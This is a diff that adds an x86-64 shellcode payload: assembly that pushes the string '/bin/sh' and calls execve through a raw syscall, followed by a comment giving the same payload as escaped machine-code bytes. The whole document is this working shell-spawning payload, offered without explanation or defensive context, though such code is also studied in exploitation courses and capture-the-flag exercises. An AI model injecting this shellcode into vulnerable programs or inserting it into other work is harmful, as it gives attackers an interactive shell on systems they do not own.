@@ -1,0 +1,11 @@
+mov rbx, 0x68732f6e69622f
+push rbx
+push rsp
+pop rdi
+xor esi, esi
+xor edx, edx
+push 0x3b
+pop rax
+syscall
+
+// x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05
